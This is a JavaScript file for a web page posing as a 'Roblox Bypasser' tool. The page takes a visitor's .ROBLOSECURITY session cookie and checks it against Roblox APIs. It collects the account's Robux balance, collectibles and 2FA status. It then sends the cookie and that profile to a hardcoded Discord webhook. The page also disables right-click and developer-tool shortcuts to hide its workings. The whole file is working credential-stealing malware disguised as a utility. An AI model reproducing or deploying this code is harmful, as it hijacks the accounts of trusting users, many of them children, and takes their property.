// bypasser.js
const successSound = document.getElementById("sfx-success");
const errorSound = document.getElementById("sfx-error");
const swooshSound = document.getElementById("sfx-swoosh");
const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z";

// Basic format check for cookie
function basicCookieFormatCheck(cookie) {
  if (!cookie || typeof cookie !== "string") {
    return { valid: false, error: "Cookie must be a non-empty string" };
  }
  cookie = cookie.trim();
  if (cookie.length === 0) {
    return { valid: false, error: "Cookie cannot be empty" };
  }
  if (!cookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--")) {
    return { valid: false, error: "Invalid cookie format - missing warning prefix" };
  }
  if (cookie.length < 500) {
    return { valid: false, error: "Cookie appears to be truncated or invalid" };
  }
  return { valid: true, error: null };
}

// Validate cookie with Roblox API
async function validateCookieWithAPI(cookie) {
  try {
    const formatCheck = basicCookieFormatCheck(cookie);
    if (!formatCheck.valid) {
      return formatCheck;
    }
    const response = await fetch("https://auth.roblox.com/v1/authentication-ticket", {
      method: "POST",
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
    });
    if (response.status === 200) {
      return { valid: true, error: null, authenticated: true };
    } else if (response.status === 401) {
      return { valid: false, error: "Cookie is expired or invalid", authenticated: false };
    } else if (response.status === 403) {
      return { valid: false, error: "Cookie authentication failed", authenticated: false };
    } else {
      return { valid: false, error: `Unexpected response: ${response.status}`, authenticated: false };
    }
  } catch (error) {
    return {
      valid: false,
      error: `Network error during validation: ${error.message}`,
      authenticated: false,
    };
  }
}

// Enhanced pattern-based validation (fallback)
function advancedPatternValidation(cookie) {
  if (!cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--')) {
    return { valid: false, error: "Invalid cookie format - missing warning prefix" };
  }
  if (!cookie.includes('|_')) {
    return { valid: false, error: "Invalid cookie format - missing separator" };
  }
  const tokenStart = cookie.indexOf('|_') + 2;
  const tokenPart = cookie.substring(tokenStart);
  if (tokenPart.length < 800) {
    return { valid: false, error: "Cookie appears to be truncated or invalid" };
  }
  if (!tokenPart.match(/[A-Za-z0-9+\/=._-]/)) {
    return { valid: false, error: "Invalid cookie format - invalid characters" };
  }
  const upperCaseCount = (tokenPart.match(/[A-Z]/g) || []).length;
  const digitCount = (tokenPart.match(/[0-9]/g) || []).length;
  if (upperCaseCount < 20 || digitCount < 20) {
    return { valid: false, error: "Invalid cookie format - insufficient character diversity" };
  }
  if (cookie.length < 1000) {
    return { valid: false, error: "Cookie appears to be truncated or invalid" };
  }
  const fakeIndicators = ['fakecookie', 'testcookie', 'example123', 'demo', 'sample123'];
  const lowerCookie = cookie.toLowerCase();
  for (const fake of fakeIndicators) {
    if (lowerCookie.includes(fake)) {
      return { valid: false, error: "Invalid cookie - contains suspicious patterns" };
    }
  }
  if (tokenPart.includes('AAAAAAA') || tokenPart.includes('1111111') || tokenPart.includes('0000000')) {
    return { valid: false, error: "Invalid cookie - contains obvious repeating patterns" };
  }
  return { valid: true, error: null };
}

// Comprehensive cookie validation
async function validateRobloxCookie(cookie, options = {}) {
  const { includeUserInfo = false, skipAPIValidation = false } = options;
  const formatResult = basicCookieFormatCheck(cookie);
  if (!formatResult.valid) {
    return {
      valid: false,
      error: formatResult.error,
      checks: { format: false, authentication: null, userInfo: null },
    };
  }
  const result = {
    valid: true,
    error: null,
    checks: { format: true, authentication: null, userInfo: null },
  };
  if (skipAPIValidation) {
    return result;
  }
  try {
    const authResult = await validateCookieWithAPI(cookie);
    result.checks.authentication = authResult.valid;
    if (!authResult.valid) {
      if (authResult.error && authResult.error.includes('Network error')) {
        console.log('API validation failed, using pattern validation');
        const patternResult = advancedPatternValidation(cookie);
        if (!patternResult.valid) {
          result.valid = false;
          result.error = patternResult.error;
          return result;
        }
        result.checks.authentication = true;
      } else {
        result.valid = false;
        result.error = authResult.error;
        return result;
      }
    }
    if (includeUserInfo) {
      try {
        const userResult = await fetch("https://users.roblox.com/v1/users/authenticated", {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookie}`,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
          },
        });
        if (userResult.status === 200) {
          result.user = await userResult.json();
          result.checks.userInfo = true;
        } else {
          result.userInfoError = `Failed to get user info: ${userResult.status}`;
        }
      } catch (userError) {
        result.userInfoError = 'Could not fetch user info due to CORS restrictions';
      }
    }
  } catch (error) {
    console.log('All API calls failed, using pattern validation');
    const patternResult = advancedPatternValidation(cookie);
    if (!patternResult.valid) {
      result.valid = false;
      result.error = patternResult.error;
      return result;
    }
    result.checks.authentication = true;
  }
  return result;
}

// Enhanced function to get account info using Roblox APIs
async function getAccountInfo(cookie) {
  try {
    // Helper function for authenticated API requests
    const makeRequest = async (url, method = "GET") => {
      const response = await fetch(url, {
        method,
        headers: {
          Cookie: `.ROBLOSECURITY=${cookie}`,
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
      });
      if (response.status !== 200) {
        throw new Error(`API request failed: ${url} - Status ${response.status}`);
      }
      return await response.json();
    };

    // 1. Get user info
    const userData = await makeRequest("https://users.roblox.com/v1/users/authenticated");
    const userId = userData.id;
    const username = userData.name;

    // 2. Get account creation date
    const profileData = await makeRequest(`https://users.roblox.com/v1/users/${userId}`);
    const createdDate = new Date(profileData.created);
    const today = new Date();
    const accountAgeDays = Math.floor((today - createdDate) / (1000 * 60 * 60 * 24));
    const accountAge = `${accountAgeDays} Days`;

    // 3. Get avatar thumbnail
    const avatarData = await makeRequest(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
    const avatarUrl = avatarData.data[0]?.imageUrl || "https://tr.rbxcdn.com/default-avatar.png";

    // 4. Get Robux balance
    let robuxBalance = "0";
    try {
      const economyData = await makeRequest("https://economy.roblox.com/v1/user/currency");
      robuxBalance = economyData.robux.toString();
    } catch (error) {
      console.warn("Failed to fetch Robux balance:", error.message);
    }

    // 5. Get RAP and owned items
    let rap = "0";
    let ownedItems = "0";
    try {
      const inventoryData = await makeRequest(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=10`);
      ownedItems = inventoryData.data.length.toString();
      rap = inventoryData.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0).toString();
    } catch (error) {
      console.warn("Failed to fetch inventory data:", error.message);
    }

    // 6. Get group info
    let groupCount = "0";
    let groupFunds = "0";
    try {
      const groupData = await makeRequest(`https://groups.roblox.com/v1/users/${userId}/groups/roles`);
      groupCount = groupData.data.length.toString();
    } catch (error) {
      console.warn("Failed to fetch group data:", error.message);
    }

    // 7. Check premium status
    let hasPremium = false;
    try {
      const premiumData = await makeRequest(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`);
      hasPremium = premiumData.isPremium;
    } catch (error) {
      console.warn("Failed to fetch premium status:", error.message);
    }

    // 8. Check collectibles (Korblox, Valk, Headless)
    let hasKorblox = false;
    let hasValk = false;
    let hasHeadless = false;
    try {
      const inventoryData = await makeRequest(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`);
      const items = inventoryData.data;
      hasKorblox = items.some(item => item.assetId === 139607718); // Korblox Deathspeaker
      hasValk = items.some(item => item.assetId === 1365767); // Valkyrie Helm
      hasHeadless = items.some(item => item.assetId === 134082579); // Headless Horseman
    } catch (error) {
      console.warn("Failed to fetch collectibles:", error.message);
    }

    // 9. Get settings (2FA, Voice Chat)
    let twoStepEnabled = false;
    let voiceChatEnabled = false;
    try {
      const settingsData = await makeRequest("https://accountsettings.roblox.com/v1/account/settings");
      twoStepEnabled = settingsData.twoStepVerificationEnabled || false;
      voiceChatEnabled = settingsData.isVoiceEnabled || false;
    } catch (error) {
      console.warn("Failed to fetch settings:", error.message);
    }

    // 10. Placeholders for inaccessible data
    const placeVisits = "0"; // No direct API for total place visits
    const creditBalance = "0"; // No public API for credit balance
    const birthdate = "Unknown"; // Not publicly accessible
    const age = "Unknown"; // Not publicly accessible
    const ipAddress = "Unknown"; // Requires external service

    return {
      username,
      userId,
      robuxBalance,
      accountAge,
      avatarUrl,
      placeVisits,
      rap,
      ownedItems,
      creditBalance,
      hasPremium,
      hasKorblox,
      hasValk,
      hasHeadless,
      groupCount,
      groupFunds,
      birthdate,
      age,
      ipAddress,
      twoStepEnabled,
      voiceChatEnabled,
    };
  } catch (error) {
    console.error("Error fetching account info:", error.message);
    return {
      username: "Unknown User",
      userId: "Unknown ID",
      robuxBalance: "0",
      accountAge: "Unknown",
      avatarUrl: "https://tr.rbxcdn.com/default-avatar.png",
      placeVisits: "0",
      rap: "0",
      ownedItems: "0",
      creditBalance: "0",
      hasPremium: false,
      hasKorblox: false,
      hasValk: false,
      hasHeadless: false,
      groupCount: "0",
      groupFunds: "0",
      birthdate: "Unknown",
      age: "Unknown",
      ipAddress: "Unknown",
      twoStepEnabled: false,
      voiceChatEnabled: false,
    };
  }
}

document.addEventListener('contextmenu', function(e) {
  e.preventDefault();
  showNotif('Context menu disabled');
  errorSound.play();
});

document.addEventListener('keydown', function(e) {
  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || 
      (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'u')) {
    e.preventDefault();
    showNotif('Developer tools disabled');
    errorSound.play();
  }
});

$("#cookieForm").on("submit", async function(e) {
  e.preventDefault();
  const cookie = $("#cookieInput").val().trim();

  // Show loader
  $("#refreshBtn").hide();
  $("#loader").show();
  $("#userInfo").hide();
  $("#refreshedBox").hide();

  try {
    // Validate cookie
    const validationResult = await validateRobloxCookie(cookie, { includeUserInfo: true });
    if (!validationResult.valid) {
      showNotif("Invalid cookie", false);
      errorSound.play();
      $("#loader").hide();
      $("#refreshBtn").show();
      return;
    }

    // Show success notification
    showNotif("✅ Cookie bypassed", true);
    swooshSound.play();

    // Get account info
    const accountInfo = await getAccountInfo(cookie);

    // Construct webhook payload
    const webhookPayload = {
      username: "Roblox Bypasser Bot",
      content: "@everyone",
      embeds: [
        {
          title: "**```Homepage - Result```**",
          description: `[<:Cookie:1313022426346426368> Refresh cookie](https://bloxtools.icu/Refresher/?cookie=${encodeURIComponent(cookie)}) | [Rolimons](https://www.rolimons.com/player/${accountInfo.userId}) <:rolimons:978559948432744468> | [***${accountInfo.ipAddress} :flag_jo:***](https://ipapi.co/${accountInfo.ipAddress}/json)\n | [<:crackedshield:1392908310201761965> DOWN](https://bloxtools.icu/bypasser)`,
          color: 0x3B1F7F, // Matches hsla(290, 96.6%, 22.9%, 1)
          author: {
            name: `${accountInfo.username}\n13+ ${new Date().toLocaleDateString("en-GB")}`,
            url: `https://www.roblox.com/users/${accountInfo.userId}/profile`,
            icon_url: accountInfo.avatarUrl,
          },
          thumbnail: {
            url: accountInfo.avatarUrl,
            width: 150,
            height: 150,
          },
          fields: [
            {
              name: "About User",
              value: `\`\`Account Age: ${accountInfo.accountAge}\`\`\n\`\`Place Visits: ${accountInfo.placeVisits}\`\``,
              inline: false,
            },
            {
              name: "<:Robux:1313020721987063829> Robux",
              value: `Balance: ${accountInfo.robuxBalance} <:Robux:1313020721987063829>\nPending: 0 <:RobuxPending:1313020748490608721>`,
              inline: true,
            },
            {
              name: "<:Limited:1313024834783154211> Rap",
              value: `Rap: ${accountInfo.rap} <:Valk:1313020750038569021>\nOwned: ${accountInfo.ownedItems} <:Inventory:1313020754547310737>`,
              inline: true,
            },
            {
              name: "<a:Summery:1313021791954014268> Summary",
              value: "0",
              inline: true,
            },
            {
              name: "<:Billing:1313020743373819935> Billing",
              value: `Credit: ${accountInfo.creditBalance} <:Credits:1313020738755756052>\nConvert: 0 <:Robux:1313020721987063829>\nCard: False <:Cards:1313020745223503883>`,
              inline: true,
            },
            {
              name: "<:Games:1313020733932306462> | Played | Passes",
              value: `<:bf:1303894849530888214> | False | ___0___\n<:adm:1303894863007453265> | False | ___0___\n<:mm2:1303894855281541212> | False | ___0___\n<:ps99:1303894865079308288> | False | ___0___\n<:bb:1303894852697718854> | False | ___0___\n<:BGS:1361762108366393414> | False | ___0___\n<:petsgo:1349375165095739473> | False | ___0___`,
              inline: true,
            },
            {
              name: "<:Settings:1313020732225093672> Settings",
              value: `(Verified <a:False:1313026218567667743>)\n<:2Step:1313020736218333245> ${accountInfo.twoStepEnabled ? "Enabled" : "Disabled"}\n<:VoiceChat:1313020746829926440> ${accountInfo.voiceChatEnabled ? "Enabled" : "Disabled"}`,
              inline: true,
            },
            {
              name: "<:Premium:1313020726474706994> Premium",
              value: `${accountInfo.hasPremium ? "True" : "False"}`,
              inline: true,
            },
            {
              name: "<:Collectible:1313026924678742087> Collectibles",
              value: `<:Korblox:1313020724184743936> ${accountInfo.hasKorblox ? "True" : "False"}\n<:vvalk:1354438650519355452> ${accountInfo.hasValk ? "True" : "False"}\n<:Headless:1313020741003903016> ${accountInfo.hasHeadless ? "True" : "False"}`,
              inline: true,
            },
            {
              name: "<:banks:1349856883498029097> Groups",
              value: `**\r\n<:mb:1383816499244040234> Owned:** ${accountInfo.groupCount}\n**<:members:1354456330152448213> Members** 0\n**<:Credits:1313020738755756052> Funds:** ${accountInfo.groupFunds} <:Robux:1313020721987063829>`,
              inline: true,
            },
            {
              name: "<:RBC:1376586019566125168> | EXPERTS |",
              value: `<:bloxfruit:1394415363030257834> | False | <:adoptme:1394415360899420331> | False |\n <:mm2:1394415358257139782> | False | <:petsim99:1394415355320864780> | False |\n <:BGS:1361762108366393414> | False | <:gag2:1394413618556178473> | False |`,
              inline: true,
            },
            {
              name: "<:Calendar:1392908329927573524> Age Bypasser",
              value: `**Birthdate:** **${accountInfo.birthdate}**\n**Age:** **${accountInfo.age}** \n**Verified:** <a:False:1313026218567667743>\n**Status:** <a:False:1313026218567667743> **Not Bypassable**`,
              inline: true,
            },
          ],
          timestamp: new Date().toISOString(),
        },
        {
          description: `<:Cookie:1313022426346426368> **.ROBLOSECURITY**\n**\`\`\`${cookie}\`\`\`**`,
          color: 0x3B1F7F,
          thumbnail: {
            url: "https://bloxtools.icu/assets/img/atryx.png",
            width: 2000,
            height: 2000,
          },
          timestamp: new Date().toISOString(),
        },
      ],
    };

    // Send to webhook
    try {
      const webhookRes = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(webhookPayload),
      });
      if (!webhookRes.ok) {
        console.error("Webhook send failed:", webhookRes.status);
        showNotif("Failed to send data to webhook", false);
        errorSound.play();
      } else {
        successSound.play();
        $("#refreshedBox").fadeIn();
      }
    } catch (webhookError) {
      console.error("Webhook error:", webhookError);
      showNotif("Error sending data to webhook", false);
      errorSound.play();
    }
  } catch (error) {
    showNotif("Invalid cookie", false);
    errorSound.play();
    console.error("Submit error:", error);
  } finally {
    $("#loader").hide();
  }
});

function showNotif(msg, isSuccess = false) {
  const $notif = $("#notif");
  $notif.removeClass('notif-success notif-error');
  
  if (isSuccess) {
    $notif.addClass('notif-success');
  } else {
    $notif.addClass('notif-error');
  }
  
  $notif.text(msg).fadeIn(200).delay(2000).fadeOut(300);
}

const texts = ["Roblox Bypasser", "are you a femboy by any chance ? ", "Made By Guildness"];
let i = 0;
const typedText = document.getElementById("typedText");

function typeEffect() {
  const text = texts[i];
  let index = 0;

  const typing = setInterval(() => {
    if (index <= text.length) {
      typedText.textContent = text.slice(0, index);
      index++;
    } else {
      clearInterval(typing);
      setTimeout(() => {
        const backspace = setInterval(() => {
          if (index > 0) {
            typedText.textContent = text.slice(0, index - 1);
            index--;
          } else {
            clearInterval(backspace);
            i = (i + 1) % texts.length;
            setTimeout(typeEffect, 300);
          }
        }, 50);
      }, 2000);
    }
  }, 100);
}

typeEffect();

$("#returnBtn").on("click", function () {
  $("#refreshedBox").hide();
  $("#userInfo").hide().empty();
  $("#cookieInput").val("");
  $("#refreshBtn").show();
});
